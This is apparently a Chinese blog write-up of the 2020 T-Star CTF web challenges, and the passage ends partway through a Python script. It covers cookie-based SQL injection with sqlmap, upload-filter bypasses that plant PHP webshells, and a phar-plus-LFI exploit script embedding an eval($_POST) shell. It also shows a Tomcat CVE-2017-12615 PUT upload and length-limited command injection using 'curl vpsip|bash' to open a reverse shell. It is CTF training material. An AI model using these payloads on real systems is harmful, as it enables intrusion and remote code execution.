srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20221012090019078"></p><h2 id="0x03-你能爆破吗"><a href="#0x03-你能爆破吗" class="headerlink" title="0x03 你能爆破吗"></a>0x03 你能爆破吗</h2><p>在用户名和密码框随便输入了点内容发现回显sql语句，不过考虑到题目名称是爆破，先尝试用Burp fuzz一下用户名和密码，期间试了下登录，发现http头里怎么都没有Cookie，最后等到fuzz完，发现用户名和密码都是admin。</p><p>登录进去发现了题目描述里提示的Cookie，字符串以等号结尾尝试一下base64解码后，发现是admin ，如下图所示。</p><p><img src="/img/2020T-Star-ctf/image-20221012090034356.png" class="lazyload" data-srcset="/img/2020T-Star-ctf/image-20221012090034356.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20221012090034356"></p><p>手动改了下数据包发现了猫腻，Cookie处和题目描述一样可以注入,不过手工测试没有进行base64编码，导致乱码产生。对整个payload进行base64编码后发现sql语句能正常拼接，如下图所示。</p><p><img src="/img/2020T-Star-ctf/image-20221012090052514.png" class="lazyload" data-srcset="/img/2020T-Star-ctf/image-20221012090052514.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20221012090052514"></p><p>使用sqlmap进行爆破，注意要使用base64encode tamper。先爆破库，分别试challenges和security，然后在security库发现flag，接着爆破表，然后爆破字段，然后根据字段dump出来就可以得到flag了。</p><p><img src="/img/2020T-Star-ctf/image-20221012090116210.png" class="lazyload" data-srcset="/img/2020T-Star-ctf/image-20221012090116210.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20221012090116210"></p><p><img src="/img/2020T-Star-ctf/image-20221012090104182.png" class="lazyload" data-srcset="/img/2020T-Star-ctf/image-20221012090104182.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20221012090104182"></p><h2 id="0x04-文件上传"><a href="#0x04-文件上传" class="headerlink" title="0x04 文件上传"></a>0x04 文件上传</h2><p>害，这个题全是泪。首先上传webshell，php结尾文件不给过，然后改后缀为jpg、gif，也不给过。然后想到合并图片和webshell，如下图。</p><p><img src="/img/2020T-Star-ctf/image-20221012090147732.png" class="lazyload" data-srcset="/img/2020T-Star-ctf/image-20221012090147732.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20221012090147732"></p><p>现在终于可以上传上去了，因为图片是限制在20k~100k的，webshell在后面，截图截不到，如下图所示。</p><p><img src="/img/2020T-Star-ctf/image-20221012090156198.png" class="lazyload" data-srcset="/img/2020T-Star-ctf/image-20221012090156198.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20221012090156198"></p><p>尝试使用%00和0x00截断gif，即bu.php%00.gif 和在burp hex里用0x00截断，虽然能上传成功，但发现图片访问不到，如下图所示。可能是PHP版本原因，不能用了。</p><p><img src="/img/2020T-Star-ctf/image-20221012090217504.png" class="lazyload" data-srcset="/img/2020T-Star-ctf/image-20221012090217504.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20221012090217504"></p><p>只能另辟蹊径，发现中间件是Apache，拿出之前刷题做的笔记，一个个试，如下图所示。</p><p><img src="/img/2020T-Star-ctf/image-20221012090223688.png" class="lazyload" data-srcset="/img/2020T-Star-ctf/image-20221012090223688.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20221012090223688"></p><p>发生pht和php7都可以正常访问，上传了个webshell，但是php代码解析异常！！！，先尝试一下为啥这样，比如我用 <code>&lt;?php phpinfo(); ?&gt; </code>发现只剩下 info(); ?&gt; 。</p><p><img src="/img/2020T-Star-ctf/image-20221012090233212.png" class="lazyload" data-srcset="/img/2020T-Star-ctf/image-20221012090233212.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20221012090233212"></p><p>这时想起题目说字符过滤，原来是在这，对比观察，发现过滤了 php和 &lt;? ，于是一步步尝试，发现了只会过滤一次，即：使用 pphphp 会被过滤为 php，但仍可到达我的目的，最终构造成</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="meta">&lt;?</span>?pphphp pphphpinfo();   <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>终于成功解析了！！如下二图所示。</p><p><img src="/img/2020T-Star-ctf/image-20221012090530605.png" class="lazyload" data-srcset="/img/2020T-Star-ctf/image-20221012090530605.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20221012090530605"></p><p><img src="/img/2020T-Star-ctf/image-20221012090533095.png" class="lazyload" data-srcset="/img/2020T-Star-ctf/image-20221012090533095.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20221012090533095"></p><p>试着使用一句话木马，发现连不上，使用 highlight_file(<strong>FILE</strong>); 发现eval被过滤了。然后尝试system之类的执行系统命令函数，发现可行，最终构造的payload如下图所示。然后并接上git图上传抓包改后缀为pht即可利用。</p><p><img src="/img/2020T-Star-ctf/image-20221012090543638.png" class="lazyload" data-srcset="/img/2020T-Star-ctf/image-20221012090543638.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20221012090543638"></p><p>通过ls 发现flag在 ../../key ，如下图所示。</p><p><img src="/img/2020T-Star-ctf/image-20221012090550250.png" class="lazyload" data-srcset="/img/2020T-Star-ctf/image-20221012090550250.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20221012090550250"></p><h2 id="0x05-文件包含GetShell"><a href="#0x05-文件包含GetShell" class="headerlink" title="0x05 文件包含GetShell"></a>0x05 文件包含GetShell</h2><p>经题目和描述已经可以猜出是phar+lfi了，然后在网页源码发现lfi.txt，即泄露的源码。</p><p><img src="/img/2020T-Star-ctf/image-20221012090607478.png" class="lazyload" data-srcset="/img/2020T-Star-ctf/image-20221012090607478.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20221012090607478"></p><p><img src="/img/2020T-Star-ctf/image-20221012090609376.png" class="lazyload" data-srcset="/img/2020T-Star-ctf/image-20221012090609376.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20221012090609376"></p><p>尝试上传php webshell发现只能上传txt结尾的文件。</p><p><img src="/img/2020T-Star-ctf/image-20221012090613778.png" class="lazyload" data-srcset="/img/2020T-Star-ctf/image-20221012090613778.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20221012090613778"></p><p>现在题目思路已经很清晰了，先利用phar构造一个poc，后缀改为txt上传，如下图所示。</p><p><img src="/img/2020T-Star-ctf/image-20221012090618162.png" class="lazyload" data-srcset="/img/2020T-Star-ctf/image-20221012090618162.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20221012090618162"></p><p>然后利用phar伪协议读取该路径，然后把PoC phar里写入的虚拟文件shell.php include进来就可以执行php代码了。</p><p>不过也有一些小坑，因为题目读取时会拼接文件名字，也就是sprintf函数，执行代码不能用GET方式，不然就不是访问到我们上传的文件了。其次就是最后写shell即可，不用写shell.php，因为sprintf帮我们加个了.php。</p><p>ls一下当前目录发现有个flag.php，最终读出来的flag如下二图所示。</p><p><img src="/img/2020T-Star-ctf/image-20221012090634955.png" class="lazyload" data-srcset="/img/2020T-Star-ctf/image-20221012090634955.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20221012090634955"></p><p><img src="/img/2020T-Star-ctf/image-20221012090637152.png" class="lazyload" data-srcset="/img/2020T-Star-ctf/image-20221012090637152.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20221012090637152"></p><p>EXP</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="variable">$p</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;my.phar&quot;</span>, <span class="number">0</span>, <span class="string">&#x27;my.phar&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="built_in">UnexpectedValueException</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Could not open my.phar&#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="built_in">BadMethodCallException</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;technically, this cannot happen&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$p</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$p</span>[<span class="string">&#x27;file1.txt&#x27;</span>] = <span class="string">&#x27;file1&#x27;</span>;</span><br><span class="line"><span class="variable">$p</span>[<span class="string">&#x27;file2.txt&#x27;</span>] = <span class="string">&#x27;file2&#x27;</span>;</span><br><span class="line"><span class="variable">$p</span>[<span class="string">&#x27;file3.txt&#x27;</span>] = <span class="string">&#x27;file3&#x27;</span>;</span><br><span class="line"><span class="variable">$p</span>[<span class="string">&#x27;shell.php&#x27;</span>] = <span class="string">&#x27;&lt;?php eval($_POST[\&#x27;x\&#x27;]); ?&gt;&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// use my.phar</span></span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;phar://my.phar/file2.txt&#x27;</span>);  <span class="comment">// echo file2</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// make a file named my.phar</span></span><br><span class="line"><span class="variable">$p</span>-&gt;setStub(<span class="string">&quot;&lt;?php</span></span><br><span class="line"><span class="string">    Phar::mapPhar(&#x27;myphar.phar&#x27;); </span></span><br><span class="line"><span class="string">__HALT_COMPILER();&quot;</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$p</span>-&gt;stopBuffering();</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="0x06-成绩单"><a href="#0x06-成绩单" class="headerlink" title="0x06 成绩单"></a>0x06 成绩单</h2><p>打开题目后输入1，单引号无回显，双引号正常，如下二图所示。</p><p><img src="/img/2020T-Star-ctf/image-20221012090713883.png" class="lazyload" data-srcset="/img/2020T-Star-ctf/image-20221012090713883.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20221012090713883"></p><p><img src="/img/2020T-Star-ctf/image-20221012090716174.png" class="lazyload" data-srcset="/img/2020T-Star-ctf/image-20221012090716174.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20221012090716174"></p><p>可以明显知道为盲注，用sqlmap爆库报表报字段，报字段比较久，因为是基于时间的盲注，即可得到flag。</p><p><img src="/img/2020T-Star-ctf/image-20221012090732677.png" class="lazyload" data-srcset="/img/2020T-Star-ctf/image-20221012090732677.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20221012090732677"></p><p><img src="/img/2020T-Star-ctf/image-20221012090734503.png" class="lazyload" data-srcset="/img/2020T-Star-ctf/image-20221012090734503.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20221012090734503"></p><h2 id="0x07-小猫咪踩灯泡"><a href="#0x07-小猫咪踩灯泡" class="headerlink" title="0x07 小猫咪踩灯泡"></a>0x07 小猫咪踩灯泡</h2><p>题目给的提示是：CVE-2017-12615，查一下这个漏洞，其原理：是通过构造特殊后缀名，绕过了tomcat检测，让它用DefaultServlet的逻辑去处理请求，从而上传jsp文件。</p><p>目前主要三种绕过方法：</p><ul><li>evil.jsp/</li><li>evil.jsp%20</li><li>evil.jsp::$DATA</li></ul><p>所以构造出如下的put请求，上传jsp文件的请求内容如下：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PUT /evil.jsp/ HTTP/1.1  </span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>79c6287a.yunyansec.com  </span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; WOW64; rv:60.0) Gecko/20100101 Firefox/60.0  </span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8  </span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2  </span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate  </span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close  </span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1  </span><br><span class="line"><span class="attribute">If-Modified-Since</span><span class="punctuation">: </span>Thu, 20 Jun 2019 10:03:08 GMT  </span><br><span class="line"><span class="attribute">If-None-Match</span><span class="punctuation">: </span>W/&quot;5619-1561024988000&quot;  </span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0  </span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>6275  </span><br><span class="line">  </span><br><span class="line">菜刀链接的JSP代码复制到这里  </span><br></pre></td></tr></table></figure><p><img src="/img/2020T-Star-ctf/image-20221012090827958.png" class="lazyload" data-srcset="/img/2020T-Star-ctf/image-20221012090827958.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20221012090827958"></p><p>菜刀连一下便可。</p><h2 id="0x09-分析代码获得flag"><a href="#0x09-分析代码获得flag" class="headerlink" title="0x09 分析代码获得flag"></a>0x09 分析代码获得flag</h2><p>人生中第一个一血，开心 2333</p><p>打开题目，查看源码，发现是限制长度小于7的命令执行，马上想到Hitcon 2017 BabyFirst_Revenge，可参考这里（<a href="https://xz.aliyun.com/t/1579%EF%BC%89%E3%80%82">https://xz.aliyun.com/t/1579）。</a></p><p>其原理是利用 linux &gt; 重定向可以直接用来写文件，直接实操一遍PoC里的内容就清楚了。首先我们需要控制命令序列的先后顺序，即文件创建的先后（例如我们应该让curl vpsip|bash顺序是可控的），我们可以用ls -t 来根据文件创建时间先后来排序进而达到此目的，如下图所示。</p><p><img src="/img/2020T-Star-ctf/image-20221012090901523.png" class="lazyload" data-srcset="/img/2020T-Star-ctf/image-20221012090901523.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20221012090901523"></p><p>然后写入我们需要执行的命令，如下图所示。</p><p><img src="/img/2020T-Star-ctf/image-20221012090908515.png" class="lazyload" data-srcset="/img/2020T-Star-ctf/image-20221012090908515.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20221012090908515"></p><p>先执行 sh _ ，即 ls -t &gt;g，就是把上图的命令写入g文件中，如下图所示。</p><p><img src="/img/2020T-Star-ctf/image-20221012090915124.png" class="lazyload" data-srcset="/img/2020T-Star-ctf/image-20221012090915124.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20221012090915124"></p><p>是乱的是因为不同文件比新写入了，如g文件，但是我们关心的是g文件，里面顺序是正常的就可以构造我们的命令。如下图所示。</p><p><img src="/img/2020T-Star-ctf/image-20221012090920121.png" class="lazyload" data-srcset="/img/2020T-Star-ctf/image-20221012090920121.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20221012090920121"></p><p>最后我们执行 sh g就可以执行我们想要的命令了。</p><p>Hitcon2017的长度限制是5，可以直接用。拿出刷题的payload直接打就可以反弹shell了。在服务器网站根目录准备好反弹shell的命令，然后nc -lvvp 8080监听一下端口，本地执行一下Python脚本，题目机器去请求我的VPS，然后执行反弹shell命令，最后shell反弹至我VPS 8080端口上，flag在/var/www/key里，如下图所示。</p><p><img src="/img/2020T-Star-ctf/image-20221012090926508.png" class="lazyload" data-srcset="/img/2020T-Star-ctf/image-20221012090926508.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20221012090926508"></p><p><img src="/img/2020T-Star-ctf/image-20221012090928890.png" class="lazyload" data-srcset="/img/2020T-Star-ctf/image-20221012090928890.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20221012090928890"></p><p><img src="/img/2020T-Star-ctf/image-20221012090930755.png" class="lazyload" data-srcset="/img/2020T-Star-ctf/image-20221012090930755.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20221012090930755"></p><p>EXP</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">payload = [</span><br><span class="line">    <span class="comment"># generate `ls -t&gt;g` file</span></span><br><span class="line">    <span class="comment"># `ls` sort is relative to variable environment LC_COLLATE</span></span><br><span class="line">    <span class="string">&#x27;&gt;ls\\&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;ls&gt;_&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&gt;\ \\&#x27;</span>, 